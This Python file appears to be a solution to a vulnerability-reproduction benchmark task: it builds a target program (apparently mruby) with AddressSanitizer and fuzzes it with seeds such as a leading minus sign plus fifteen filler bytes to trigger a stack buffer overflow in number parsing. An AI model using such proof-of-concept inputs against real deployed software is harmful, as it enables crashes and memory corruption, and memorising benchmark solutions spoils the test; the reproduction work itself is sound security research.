import os
import sys
import subprocess
import time
import random
import tempfile
import shutil

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the vulnerability.
        
        Args:
            src_path: Path to the vulnerable source code tarball
            
        Returns:
            bytes: The PoC input that should trigger the vulnerability
        """
        # Save current working directory
        original_cwd = os.getcwd()
        target_bin = None
        
        try:
            os.chdir(src_path)
            
            # Setup environment for compilation with ASAN
            env = os.environ.copy()
            env["CC"] = "clang"
            env["CXX"] = "clang++"
            env["CFLAGS"] = "-fsanitize=address,undefined -g"
            env["CXXFLAGS"] = "-fsanitize=address,undefined -g"
            env["LDFLAGS"] = "-fsanitize=address,undefined"
            
            # 1. Attempt to build the target
            # Heuristic: Check for Rakefile (mruby)
            if os.path.exists("Rakefile"):
                # Try using rake (standard for mruby)
                subprocess.run(["rake"], env=env, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=300)
                if os.path.exists("bin/mruby"):
                    target_bin = os.path.abspath("bin/mruby")
            
            # Fallback build systems if rake failed or not present
            if not target_bin:
                if os.path.exists("configure"):
                    subprocess.run(["./configure"], env=env, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=120)
                
                if os.path.exists("Makefile") or os.path.exists("makefile"):
                    subprocess.run(["make", "-j8"], env=env, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=300)
                
                # Locate binary
                if os.path.exists("bin/mruby"):
                    target_bin = os.path.abspath("bin/mruby")
                else:
                    # Search for likely executable
                    for root, _, files in os.walk("."):
                        for f in files:
                            if "mruby" in f or "fuzz" in f or "test" in f:
                                path = os.path.join(root, f)
                                if os.access(path, os.X_OK) and not path.endswith(".sh") and not path.endswith(".py"):
                                    # Prefer 'mruby' binary
                                    if f == "mruby":
                                        target_bin = os.path.abspath(path)
                                        break
                                    if not target_bin:
                                        target_bin = os.path.abspath(path)
                        if target_bin and "mruby" in os.path.basename(target_bin):
                            break

        except Exception as e:
            # Build failed, proceed to use heuristics
            pass
        finally:
            os.chdir(original_cwd)

        # 2. Heuristic generation & Fuzzing
        # Vulnerability: "leading minus sign ... parsing advances ... not an infinity"
        # Type: Stack Buffer Overflow
        # Ground truth length: 16 bytes
        
        # Seeds based on description
        seeds = [
            b"-", 
            b"-I",
            b"-Infinity",
            b"-inf",
            b"-nan",
            b"-0",
            b"-1.0",
            b"-1e10",
            b"-0x1",
            b"-" + b"A" * 15,     # Leading minus followed by garbage
            b"-" + b"\x00" * 15,  # Leading minus followed by nulls
            b"-I" + b"A" * 14,    # Fake infinity start
            b"-.1",
            b"-.",
            b"- " * 8,
        ]

        if not target_bin or not os.path.exists(target_bin):
            # If build failed, return a highly probable guess
            return b"-" + b"A" * 15

        # Fuzzing loop
        start_time = time.time()
        time_limit = 25 # seconds
        
        # Create corpus
        corpus = list(seeds)
        
        # Check seeds first
        for seed in seeds:
            if self._check_crash(target_bin, seed):
                return seed
                
        # Mutate
        while time.time() - start_time < time_limit:
            base = random.choice(corpus)
            candidate = self._mutate(base)
            
            # Enforce length constraint hints (around 16 bytes)
            if len(candidate) > 32:
                candidate = candidate[:32]
            
            if self._check_crash(target_bin, candidate):
                return candidate
            
            # Add to corpus occasionally
            if random.random() < 0.05:
                corpus.append(candidate)
        
        # Fallback if no crash found
        return b"-" + b"A" * 15

    def _mutate(self, data: bytes) -> bytes:
        if not data: return b"-"
        res = bytearray(data)
        op = random.randint(0, 4)
        
        if op == 0: # Bit flip
            idx = random.randint(0, len(res)-1)
            res[idx] ^= (1 << random.randint(0, 7))
        elif op == 1: # Insert random byte
            idx = random.randint(0, len(res))
            res.insert(idx, random.randint(0, 255))
        elif op == 2: # Delete byte
            if len(res) > 1:
                idx = random.randint(0, len(res)-1)
                del res[idx]
        elif op == 3: # Replace byte
            idx = random.randint(0, len(res)-1)
            res[idx] = random.randint(0, 255)
        elif op == 4: # Append specific problematic chars
            res.extend(random.choice([b'I', b'n', b'f', b'0', b'.']))
            
        return bytes(res)

    def _check_crash(self, binary: str, payload: bytes) -> bool:
        with tempfile.NamedTemporaryFile(delete=False, mode='wb') as tf:
            tf.write(payload)
            tf_name = tf.name
            
        try:
            # Run binary with input file
            # Most parsers (mruby, etc) take filename as arg
            result = subprocess.run(
                [binary, tf_name], 
                stdout=subprocess.DEVNULL, 
                stderr=subprocess.PIPE, 
                timeout=1.0
            )
            
            if result.returncode != 0:
                stderr_out = result.stderr.decode(errors='ignore')
                # Check for specific sanitizer errors or segfaults
                if "stack-buffer-overflow" in stderr_out or \
                   "AddressSanitizer" in stderr_out or \
                   result.returncode == -11: # SIGSEGV
                    return True
        except Exception:
            pass
        finally:
            if os.path.exists(tf_name):
                os.unlink(tf_name)
        
        return False